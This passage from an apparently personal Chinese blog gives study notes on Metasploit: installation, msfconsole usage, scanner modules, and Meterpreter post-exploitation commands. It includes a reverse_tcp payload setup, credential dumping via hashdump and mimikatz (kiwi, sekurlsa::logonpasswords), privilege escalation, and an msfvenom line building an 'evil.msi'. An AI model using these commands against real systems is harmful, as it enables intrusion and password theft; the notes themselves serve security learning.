<li>渗透攻击模块：利用发现的安全漏洞或配置弱点对目标系统进行攻击，以植入和运行攻击载荷，从而获取远程目标系统访问权<ul>
<li>主动渗透攻击：主动渗透攻击所利用的漏洞位于服务端软件与服务承载上层应用程序中</li>
<li>被动渗透攻击：被动渗透攻击所利用的漏洞位于客户端软件中，例如：浏览器、浏览器插件、电子邮件客户端等</li>
</ul>
</li>
<li>攻击载荷模块：在渗透攻击成功后使目标系统运行一段植入代码，通常用于为渗透这打开在目标系统上的控制会话连接</li>
<li>空指令模块：一些对程序运行不会构成任何实质影响的空指令或者无关操作指令，例如：在x86架构的CPU主机上操作码是0x90</li>
<li>编辑器模块：确保攻击载荷中不会出现渗透攻击过程中应加以避免的坏字符；对攻击载荷进行免杀处理</li>
<li>后渗透模块：提供攻击跳板</li>
<li>免杀模块：对载荷进行免杀处理</li>
</ul>
<h2 id="Metasploit-Framework"><a href="#Metasploit-Framework" class="headerlink" title="Metasploit Framework"></a>Metasploit Framework</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><h4 id="通过官方一键安装脚本安装"><a href="#通过官方一键安装脚本安装" class="headerlink" title="通过官方一键安装脚本安装"></a>通过官方一键安装脚本安装</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall</span><br><span class="line">chmod 755 msfinstall</span><br><span class="line">./msfinstall</span><br></pre></td></tr></table></figure>

<h4 id="通过Linux包管理工具安装"><a href="#通过Linux包管理工具安装" class="headerlink" title="通过Linux包管理工具安装"></a>通过Linux包管理工具安装</h4><h5 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install metasploit-framework</span><br></pre></td></tr></table></figure>

<ul>
<li>安装位置：<code>/usr/share/metasploit-framework</code></li>
</ul>
<h5 id="Debian"><a href="#Debian" class="headerlink" title="Debian"></a>Debian</h5><h6 id="将Kali的软件源添加到Debian的软件源列表"><a href="#将Kali的软件源添加到Debian的软件源列表" class="headerlink" title="将Kali的软件源添加到Debian的软件源列表"></a>将Kali的软件源添加到Debian的软件源列表</h6><figure class="highlight text"><figcaption><span>/etc/apt/sources.list</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>

<h6 id="安装签名"><a href="#安装签名" class="headerlink" title="安装签名"></a>安装签名</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -q -O - https://archive.kali.org/archive-key.asc | apt-key add</span><br></pre></td></tr></table></figure>

<h6 id="更新软件源"><a href="#更新软件源" class="headerlink" title="更新软件源"></a>更新软件源</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br></pre></td></tr></table></figure>

<h6 id="安装MSF"><a href="#安装MSF" class="headerlink" title="安装MSF"></a>安装MSF</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install metasploit-framework</span><br></pre></td></tr></table></figure>

<h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfupdate</span><br></pre></td></tr></table></figure>

<h3 id="初始化漏洞数据库"><a href="#初始化漏洞数据库" class="headerlink" title="初始化漏洞数据库"></a>初始化漏洞数据库</h3><ul>
<li>首次使用</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfdb init</span><br></pre></td></tr></table></figure>

<h3 id="启动msf控制台"><a href="#启动msf控制台" class="headerlink" title="启动msf控制台"></a>启动msf控制台</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>

<h2 id="msf命令"><a href="#msf命令" class="headerlink" title="msf命令"></a>msf命令</h2><h3 id="查找漏洞"><a href="#查找漏洞" class="headerlink" title="查找漏洞"></a>查找漏洞</h3><blockquote>
<p><code>17</code>：指的是漏洞发现的年份<br><code>010</code>：指的是当年发现的漏洞的编号</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search ms17_010</span><br></pre></td></tr></table></figure>

<h3 id="使用漏洞利用的模块"><a href="#使用漏洞利用的模块" class="headerlink" title="使用漏洞利用的模块"></a>使用漏洞利用的模块</h3><ul>
<li>一个模块就是一个<code>.rb</code>的Ruby脚本</li>
</ul>
<blockquote>
<p><code>&lt;name&gt;</code>：模块名</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use &lt;name&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>模块的位置：<code>/usr/share/metasploit-framework/modules</code></li>
</ul>
<h3 id="查看漏洞所有详情"><a href="#查看漏洞所有详情" class="headerlink" title="查看漏洞所有详情"></a>查看漏洞所有详情</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(...) &gt; info</span><br></pre></td></tr></table></figure>

<h4 id="查看漏洞选项详情"><a href="#查看漏洞选项详情" class="headerlink" title="查看漏洞选项详情"></a>查看漏洞选项详情</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(...) &gt; show options</span><br></pre></td></tr></table></figure>

<h4 id="查看可用的攻击手段"><a href="#查看可用的攻击手段" class="headerlink" title="查看可用的攻击手段"></a>查看可用的攻击手段</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(...) &gt; show payloads</span><br></pre></td></tr></table></figure>

<h4 id="查看可执行的操作系统"><a href="#查看可执行的操作系统" class="headerlink" title="查看可执行的操作系统"></a>查看可执行的操作系统</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(...) &gt; show targets</span><br></pre></td></tr></table></figure>

<h3 id="设置漏洞利用的参数"><a href="#设置漏洞利用的参数" class="headerlink" title="设置漏洞利用的参数"></a>设置漏洞利用的参数</h3><ul>
<li>根据列出的<code>Module options</code>，查看所有选项，然后查看必选选项，也就是<code>Required</code>字段为yes的数据，如果此条数据的<code>Current Setting</code>为空，需要添加参数</li>
</ul>
<blockquote>
<p><code>RHOST</code>：参数名<br><code>127.0.0.1</code>：参数值</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(...) &gt; set RHOST 127.0.0.1</span><br></pre></td></tr></table></figure>

<h3 id="设置漏洞利用的攻击手段"><a href="#设置漏洞利用的攻击手段" class="headerlink" title="设置漏洞利用的攻击手段"></a>设置漏洞利用的攻击手段</h3><ul>
<li>根据列出的<code>Payload options</code>，查看所有选项，然后查看必选选项，也就是<code>Required</code>字段为yes的数据，如果此条数据的<code>Current Setting</code>为空，需要添加参数</li>
</ul>
<blockquote>
<p><code>payload/windows/x64/meterpreter/reverse_tcp</code>：攻击手段名</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(...) &gt; set payload payload/windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>

<h3 id="开始执行漏洞利用"><a href="#开始执行漏洞利用" class="headerlink" title="开始执行漏洞利用"></a>开始执行漏洞利用</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(...) &gt; exploit</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(...) &gt; run</span><br></pre></td></tr></table></figure>

<h3 id="返回使用脚本之前"><a href="#返回使用脚本之前" class="headerlink" title="返回使用脚本之前"></a>返回使用脚本之前</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(...) &gt; back</span><br></pre></td></tr></table></figure>

<h3 id="jobs"><a href="#jobs" class="headerlink" title="jobs"></a>jobs</h3><h4 id="查看所有jobs"><a href="#查看所有jobs" class="headerlink" title="查看所有jobs"></a>查看所有jobs</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; jobs</span><br></pre></td></tr></table></figure>

<h4 id="关闭所有jobs"><a href="#关闭所有jobs" class="headerlink" title="关闭所有jobs"></a>关闭所有jobs</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; jobs -K</span><br></pre></td></tr></table></figure>

<h2 id="Windows上线"><a href="#Windows上线" class="headerlink" title="Windows上线"></a>Windows上线</h2><ul>
<li><a href="/2024/08/01/MSF%E5%AE%9E%E7%8E%B0Windows%E4%B8%8A%E7%BA%BF/">传送门</a></li>
</ul>
<h2 id="Linux上线"><a href="#Linux上线" class="headerlink" title="Linux上线"></a>Linux上线</h2><ul>
<li><a href="/2024/12/09/MSF%E5%AE%9E%E7%8E%B0Linux%E4%B8%8A%E7%BA%BF/">传送门</a></li>
</ul>
<h2 id="Android上线"><a href="#Android上线" class="headerlink" title="Android上线"></a>Android上线</h2><ul>
<li><a href="/2020/01/10/MSF%E5%AE%9E%E7%8E%B0Android%E4%B8%8A%E7%BA%BF/">传送门</a></li>
</ul>
<h2 id="meterpreter命令"><a href="#meterpreter命令" class="headerlink" title="meterpreter命令"></a>meterpreter命令</h2><ul>
<li>获取反弹shell后的命令</li>
</ul>
<h3 id="查看可以对对方使用的所有命令"><a href="#查看可以对对方使用的所有命令" class="headerlink" title="查看可以对对方使用的所有命令"></a>查看可以对对方使用的所有命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; help</span><br></pre></td></tr></table></figure>

<h3 id="会话切换到后台"><a href="#会话切换到后台" class="headerlink" title="会话切换到后台"></a>会话切换到后台</h3><ul>
<li>将meterpreter终端隐藏在后台，继续使用msf终端</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br></pre></td></tr></table></figure>

<h3 id="查看所有后台的会话"><a href="#查看所有后台的会话" class="headerlink" title="查看所有后台的会话"></a>查看所有后台的会话</h3><blockquote>
<p><code>-i</code>：切入后台会话</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; session</span><br></pre></td></tr></table></figure>

<h3 id="切换指定编号的会话"><a href="#切换指定编号的会话" class="headerlink" title="切换指定编号的会话"></a>切换指定编号的会话</h3><blockquote>
<p><code>&lt;id&gt;</code>：会话的编号</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; session &lt;id&gt;</span><br></pre></td></tr></table></figure>

<h3 id="获取对方系统Shell"><a href="#获取对方系统Shell" class="headerlink" title="获取对方系统Shell"></a>获取对方系统Shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure>

<h3 id="关闭当前会话"><a href="#关闭当前会话" class="headerlink" title="关闭当前会话"></a>关闭当前会话</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; exit</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; quit</span><br></pre></td></tr></table></figure>

<h3 id="类似Shell命令的基本命令"><a href="#类似Shell命令的基本命令" class="headerlink" title="类似Shell命令的基本命令"></a>类似Shell命令的基本命令</h3><blockquote>
<p><code>&lt;dir&gt;</code>：切换的目录<br><code>&lt;file&gt;</code>：文件路径</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换路径</span></span><br><span class="line">meterpreter &gt; cd &lt;dir&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前路径下的文件</span></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前所在的路径</span></span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看文件内容</span></span><br><span class="line">meterpreter &gt; cat &lt;file&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用vim编辑器打开指定文件</span></span><br><span class="line">meterpreter &gt; edit &lt;file&gt;</span><br></pre></td></tr></table></figure>

<h3 id="搜索文件"><a href="#搜索文件" class="headerlink" title="搜索文件"></a>搜索文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看帮助</span></span><br><span class="line">meterpreter &gt; search -h</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">搜索文件</span></span><br><span class="line">meterpreter &gt; search -f *.txt</span><br></pre></td></tr></table></figure>

<h3 id="查看配置信息"><a href="#查看配置信息" class="headerlink" title="查看配置信息"></a>查看配置信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看系统信息</span></span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前用户（权限）</span></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看所有进程</span></span><br><span class="line">meterpreter &gt; ps</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前进程<span class="built_in">id</span></span></span><br><span class="line">meterpreter &gt; getpid</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看网卡信息</span></span><br><span class="line">meterpreter &gt; ifconfig</span><br><span class="line">meterpreter &gt; ipconfig</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看路由信息</span></span><br><span class="line">meterpreter &gt; route</span><br></pre></td></tr></table></figure>

<h3 id="切换进程"><a href="#切换进程" class="headerlink" title="切换进程"></a>切换进程</h3><ul>
<li>将当前的进程切换（附加）到另一个进程上（Windows上通常切换到<code>explorer.exe</code>上）</li>
<li>只能从高权限用户的进程切到低权限用户的进程</li>
</ul>
<blockquote>
<p><code>&lt;pid&gt;</code>：进程编号</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; migrate &lt;pid&gt;</span><br></pre></td></tr></table></figure>

<h3 id="上传-下载文件"><a href="#上传-下载文件" class="headerlink" title="上传&#x2F;下载文件"></a>上传&#x2F;下载文件</h3><h4 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h4><ul>
<li>把本机的指定文件上传到目标的当前目录下</li>
</ul>
<blockquote>
<p><code>&lt;file_source&gt;</code>：本机的指定文件路径<br><code>&lt;file_target&gt;</code>：目标的指定文件路径</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload &lt;file_source&gt; &lt;file_target&gt;</span><br></pre></td></tr></table></figure>

<h4 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h4><ul>
<li>把目标的文件下载到本机的当前目录下</li>
</ul>
<blockquote>
<p><code>&lt;file&gt;</code>：目标的指定文件路径</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; download &lt;file&gt;</span><br></pre></td></tr></table></figure>

<h3 id="执行文件"><a href="#执行文件" class="headerlink" title="执行文件"></a>执行文件</h3><ul>
<li>执行目标的可执行文件并返回运行后的进程id</li>
</ul>
<blockquote>
<p><code>&lt;file&gt;</code>：目标的文件路径</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看帮助</span></span><br><span class="line">meterpreter &gt; execute -h</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行文件</span></span><br><span class="line">meterpreter &gt; execute -f &lt;file&gt;</span><br></pre></td></tr></table></figure>

<h3 id="结束进程"><a href="#结束进程" class="headerlink" title="结束进程"></a>结束进程</h3><ul>
<li>根据进程id关闭指定程序的进程</li>
</ul>
<blockquote>
<p><code>&lt;pid&gt;</code>：进程id</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; kill &lt;pid&gt; </span><br></pre></td></tr></table></figure>

<h3 id="关机"><a href="#关机" class="headerlink" title="关机"></a>关机</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shutdown</span><br></pre></td></tr></table></figure>

<h3 id="屏幕快照"><a href="#屏幕快照" class="headerlink" title="屏幕快照"></a>屏幕快照</h3><ul>
<li>在本机当前路径下生成一个随机文件名的目标屏幕快照文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; screenshot</span><br></pre></td></tr></table></figure>

<h3 id="获取系统权限"><a href="#获取系统权限" class="headerlink" title="获取系统权限"></a>获取系统权限</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem</span><br></pre></td></tr></table></figure>

<h3 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br></pre></td></tr></table></figure>

<h3 id="联动mimikatz"><a href="#联动mimikatz" class="headerlink" title="联动mimikatz"></a>联动mimikatz</h3><h4 id="载入模块"><a href="#载入模块" class="headerlink" title="载入模块"></a>载入模块</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load kiwi</span><br></pre></td></tr></table></figure>

<h4 id="查看帮助"><a href="#查看帮助" class="headerlink" title="查看帮助"></a>查看帮助</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; help kiwi</span><br></pre></td></tr></table></figure>

<h4 id="查看所有凭据"><a href="#查看所有凭据" class="headerlink" title="查看所有凭据"></a>查看所有凭据</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; creds_all</span><br></pre></td></tr></table></figure>

<h4 id="使用mimikatz完整功能"><a href="#使用mimikatz完整功能" class="headerlink" title="使用mimikatz完整功能"></a>使用mimikatz完整功能</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; kiwi_cmd sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<h2 id="常用的漏洞利用模块"><a href="#常用的漏洞利用模块" class="headerlink" title="常用的漏洞利用模块"></a>常用的漏洞利用模块</h2><h3 id="敏感目录扫描"><a href="#敏感目录扫描" class="headerlink" title="敏感目录扫描"></a>敏感目录扫描</h3><blockquote>
<p><code>auxiliary/scanner/http/dir_scanner</code></p>
</blockquote>
<h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><blockquote>
<p><code>auxiliary/scanner/discovery/arp_sweep</code>：ARP扫描，枚举网络中所有的活跃主机<br><code>auxiliary/scanner/discovery/empty_udp</code>：空扫描<br><code>auxiliary/scanner/discovery/ipv6_multicast_ping</code><br><code>auxiliary/scanner/discovery/ipv6_neighbor</code><br><code>auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement</code><br><code>auxiliary/scanner/discovery/udp_probe</code><br><code>auxiliary/scanner/discovery/udp_sweep</code></p>
</blockquote>
<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><blockquote>
<p><code>auxiliary/scanner/portscan/ack</code><br><code>auxiliary/scanner/portscan/syn</code>：扫描速度较快，结果比较准，不易被察觉<br><code>auxiliary/scanner/portscan/xmas</code><br><code>auxiliary/scanner/portscan/ftpbounce</code><br><code>auxiliary/scanner/portscan/tcp</code></p>
</blockquote>
<h3 id="服务查点"><a href="#服务查点" class="headerlink" title="服务查点"></a>服务查点</h3><blockquote>
<p><code>auxiliary/scanner/telnet/telnet_version</code>：查看是否开启telnet服务<br><code>auxiliary/scanner/ssh/ssh_version</code>：查看是否开启ssh服务<br><code>auxiliary/scanner/mssql/mssql_ping</code>：查看是否开启Microsoft SQL Server服务</p>
</blockquote>
<h2 id="msfvenom命令"><a href="#msfvenom命令" class="headerlink" title="msfvenom命令"></a>msfvenom命令</h2><h3 id="将CMD命令打包为可执行程序"><a href="#将CMD命令打包为可执行程序" class="headerlink" title="将CMD命令打包为可执行程序"></a>将CMD命令打包为可执行程序</h3><blockquote>
<p><code>&lt;cmd&gt;</code>：CMD命令</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/exec CMD=&#x27;&lt;cmd&gt;&#x27; -f msi &gt; evil.msi</span><br></pre></td></tr></table></figure>

<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Lf4y1t7Mc/">哔哩哔哩——千锋教育网络安全学院</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45588247/article/details/119497964">CSDN——剑客 getshell</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/weaKn19ht/p/12185407.html">博客园——我是永恒之友</a></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div><svg class="coin" width="28" height="28" viewBox="0 0 28 28" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M14.045 25.5454C7.69377 25.5454 2.54504 20.3967 2.54504 14.0454C2.54504 7.69413 7.69377 2.54541 14.045 2.54541C20.3963 2.54541 25.545 7.69413 25.545 14.0454C25.545 17.0954 24.3334 20.0205 22.1768 22.1771C20.0201 24.3338 17.095 25.5454 14.045 25.5454ZM9.66202 6.81624H18.2761C18.825 6.81624 19.27 7.22183 19.27 7.72216C19.27 8.22248 18.825 8.62807 18.2761 8.62807H14.95V10.2903C17.989 10.4444 20.3766 12.9487 20.3855 15.9916V17.1995C20.3854 17.6997 19.9799 18.1052 19.4796 18.1052C18.9793 18.1052 18.5738 17.6997 18.5737 17.1995V15.9916C18.5667 13.9478 16.9882 12.2535 14.95 12.1022V20.5574C14.95 21.0577 14.5444 21.4633 14.0441 21.4633C13.5437 21.4633 13.1382 21.0577 13.1382 20.5574V12.1022C11.1 12.2535 9.52148 13.9478 9.51448 15.9916V17.1995C9.5144 17.6997 9.10883 18.1052 8.60856 18.1052C8.1083 18.1052 7.70273 17.6997 7.70265 17.1995V15.9916C7.71158 12.9487 10.0992 10.4444 13.1382 10.2903V8.62807H9.66202C9.11309 8.62807 8.66809 8.22248 8.66809 7.72216C8.66809 7.22183 9.11309 6.81624 9.66202 6.81624Z" fill="currentColor"></path></svg></div>
  <button>
    储钱罐
  </button>
  <div class="post-reward">
      <div>
        <img src="/assets/images/reward/images/wxpay.png" alt="57uv6Z6g 微信支付">
        <span>微信支付</span>
      </div>
      <div>
        <img src="/assets/images/reward/images/alipay.png" alt="57uv6Z6g 支付宝">
        <span>支付宝</span>
      </div>
      <div>
        <img src="/assets/images/reward/images/qqpay.png" alt="57uv6Z6g qqpay">
        <span>qqpay</span>
      </div>
      <div>
        <img src="/assets/images/reward/images/bitcoin.png" alt="57uv6Z6g 比特币">
        <span>比特币</span>
      </div>
      <div>
        <img src="/assets/images/reward/images/ethereum.png" alt="57uv6Z6g ethereum">
        <span>ethereum</span>
      </div>
      <div>
        <img src="/assets/images/reward/images/monero.png" alt="57uv6Z6g monero">
        <span>monero</span>
      </div>
      <div>
        <img src="/assets/images/reward/images/paypal.png" alt="57uv6Z6g 贝宝">
        <span>贝宝</span>
      </div>

  </div>
</div>

          <div class="post-tags">
              <a href="/tags/Metasploit/" rel="tag"># Metasploit</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/02/07/%E6%95%B4%E5%90%88Windows%E5%AE%89%E8%A3%85%E9%95%9C%E5%83%8F/" rel="prev" title="【笔记】整合Windows安装镜像">
                  <i class="fa fa-angle-left"></i> 【笔记】整合Windows安装镜像
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/02/24/%E5%AF%84%E5%AD%98%E5%99%A8/" rel="next" title="【笔记】寄存器">
                  【笔记】寄存器 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






    <div class="comments"><div id="twikoo-comments"></div></div>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2019 – 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">57uv6Z6g</span>
  </div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>
<div id="site-time"></div>


<div id="current-visitors-count"></div>


<div id="site-badge"></div>


<div id="loading-door-left"></div>
<div id="loading-door-right"></div>
<a id="loading-door-a" href="javascript:loadingDoorOpen();">芝麻开门</a>


<div id="waifu">
  <div id="waifu-tips"></div>
  <canvas id="live2d" width="800" height="800"></canvas>
</div>
<div id="waifu-toggle">
  <span>看板娘</span>
</div>


<link rel="stylesheet" href="/dist/bundle.css">


<script src="/dist/bundle.js"></script>


    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
